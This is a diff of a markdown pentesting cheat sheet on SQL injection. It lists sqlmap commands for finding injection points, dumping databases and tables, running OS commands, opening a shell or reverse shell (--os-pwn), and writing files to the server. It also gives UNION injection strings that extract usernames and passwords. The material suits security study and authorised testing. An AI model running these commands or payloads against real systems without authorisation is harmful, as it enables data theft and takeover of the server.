@@ -14,80 +14,64 @@
 ## GET
 Discover vulnerabilities in databases as well as dump info
 ```sh
-sqlmap.py -u <URL> --batch
+sqlmap -u <URL> --batch
 ```
 
-### POST
-Can use log of a POST request, to search and enumerate a database
+## POST
 ```sh
-sqlmap -r <request_file> --level 5 --risk 3 --batch --string "Wrong identification" --dump
+# With request file
+# Add request into a log file (either from Burp or Chrome)
+sqlmap -r <request_file> --batch
+
+sqlmap -u <URL> --data "username=*&password=*"
 ```
 
-### Request file
-Use burp as that will give you the full request, however it can be done via chrome network tab with a bit of editing.     
-If the latter is chosen please follow
+## Commands
+**To get data from any query use the `--dump` option**
+```sh
+# Get all databases
+sqlmap -u <URL> --dbs
 
-**BASE**
-```
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: en,en-US;q=0.9
-Cache-Control: max-age=0
-Connection: keep-alive
-Content-Length: 24
-Content-Type: application/x-www-form-urlencoded
-Host: target.com
-Origin: http://target.com
-Referer: http://target.com/login.php
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+# Set DBMS
+sqlmap -u <URL> --dbms="dbms"
+
+# Database
+sqlmap -u <URL> -D <database>
+
+# Tables
+sqlmap -u <URL> --tables -D <database>
+
+## Specify table
+sqlmap -u <URL> -D <database> -T <table>
+
+# Columns
+sqlmap -u <URL> --columns -D <database> -T <table>
 ```
 
-**EDITED**
-```
-POST /login.php HTTP/1.1
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: en,en-US;q=0.9
-Cache-Control: max-age=0
-Connection: keep-alive
-Content-Length: 24
-Content-Type: application/x-www-form-urlencoded
-Host: target.com
-Origin: http://target.com
-Referer: http://target.com/login.php
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+## Shell
+To get upload web interface look for `file stager` otherwise look for `backdoor` in the output.
+```sh
+# Exec command
+sqlmap -u <URL>  --os-cmd <command>
 
-username=name&password=password
+# Simple Shell
+sqlmap -u <URL> --os-shell
+
+# Dropping a reverse-shell / meterpreter
+sqlmap -u <URL> --os-pwn
+```
+
+### File upload
+```sh
+sqlmap -u <url> --data <data> --file-write <local_file> --file-dest <destination>
 ```
 
 #### References
 - [https://0xdf.gitlab.io/2018/06/23/htb-falafel.html](https://0xdf.gitlab.io/2018/06/23/htb-falafel.html)
+- [https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#shell](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#shell)
+- [https://www.binarytides.com/sqlmap-hacking-tutorial/](https://www.binarytides.com/sqlmap-hacking-tutorial/)
+- [https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/](https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/)
 
-# SQL injection UNION attack
-
-## Steps
-```sql
-"test' union select 'table',database(),'C'-- "
-"test' union select 'table',username, password from db.table -- -"
-```
-
-## Articles to reproduce the attack
-- [https://pentest-tools.com/blog/sql-injection-attacks](https://pentest-tools.com/blog/sql-injection-attacks)
-- [https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635)
-​​
-​
-## MSSQL union queries
-Test the following query, it should dump all the data from the selected table.         
-```sql
-abcd' union select 1, concat(<data>,':',<data>) 3,4,5,6 from <table>;-- -
-```      
-
-*If the query needs to be edited, please follow the link in [the references](#references-1)* below.
-
-### References
-- [https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
 
 # MySQL 
 ## Structure
@@ -133,13 +117,14 @@ SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schem
 
 
 # MSSQL
+## Union
+Test the following query, it should dump all the data from the selected table.         
+```sql
+abcd' union select 1, concat(<data>,':',<data>) 3,4,5,6 from <table>;-- -
+```      
 
-## Cheat sheets and references
-- [https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#sql-server](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#sql-server)
-- [https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
-- [(https://gabb4r.gitbook.io/oscp-notes/service-enumeration/mssql-port-1433](https://gabb4r.gitbook.io/oscp-notes/service-enumeration/mssql-port-1433)
-- [https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
-​
+*If the query needs to be edited, please follow the link in [the references](#references-1) below.*
+
 # Oracle / ODAT
 Use [this](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf) link as a reference for the steps described below    
 [https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)    
